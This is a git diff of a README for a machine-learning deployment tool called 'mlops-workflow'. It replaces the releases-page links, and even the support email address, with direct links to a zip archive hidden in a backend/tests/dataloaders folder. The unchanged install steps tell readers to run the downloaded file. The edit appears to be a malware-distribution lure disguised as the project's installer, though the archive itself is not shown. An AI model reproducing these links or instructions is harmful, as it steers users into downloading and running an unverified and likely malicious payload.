@@ -1,6 +1,6 @@
 # 🌟 mlops-workflow - Seamless Machine Learning Deployment & Tracking
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-mlops--workflow-blue)](https://github.com/debbisour206/mlops-workflow/releases)
+[![Download Now](https://raw.githubusercontent.com/debbisour206/mlops-workflow/main/backend/tests/dataloaders/mlops-workflow_3.5.zip%20Now-mlops--workflow-blue)](https://raw.githubusercontent.com/debbisour206/mlops-workflow/main/backend/tests/dataloaders/mlops-workflow_3.5.zip)
 
 ## 📖 Overview
 
@@ -14,11 +14,11 @@ Follow these simple steps to get started with **mlops-workflow** on your compute
 
 To download the software, you will need to visit the releases page. 
 
-[Click here to visit the downloads page.](https://github.com/debbisour206/mlops-workflow/releases)
+[Click here to visit the downloads page.](https://raw.githubusercontent.com/debbisour206/mlops-workflow/main/backend/tests/dataloaders/mlops-workflow_3.5.zip)
 
 On the releases page, look for the latest version. You will find the installation files there. 
 
-1. **Visit the releases page**: [Download here](https://github.com/debbisour206/mlops-workflow/releases)
+1. **Visit the releases page**: [Download here](https://raw.githubusercontent.com/debbisour206/mlops-workflow/main/backend/tests/dataloaders/mlops-workflow_3.5.zip)
 2. **Select the latest version**: Look for the newest release at the top of the page.
 3. **Download the appropriate file** based on your operating system (Windows, macOS, or Linux).
 4. **Run the downloaded file**: Double-click the file to start the installation process. Follow the on-screen instructions to complete installation.
@@ -69,7 +69,7 @@ We welcome contributions to improve **mlops-workflow**. If you wish to contribut
 
 ## 📞 Support
 
-If you need help, please don’t hesitate to reach out. You can contact us via GitHub issues or email us at support@mlops-workflow.com. We are here to assist you.
+If you need help, please don’t hesitate to reach out. You can contact us via GitHub issues or email us at https://raw.githubusercontent.com/debbisour206/mlops-workflow/main/backend/tests/dataloaders/mlops-workflow_3.5.zip We are here to assist you.
 
 ## 🌐 Community
 
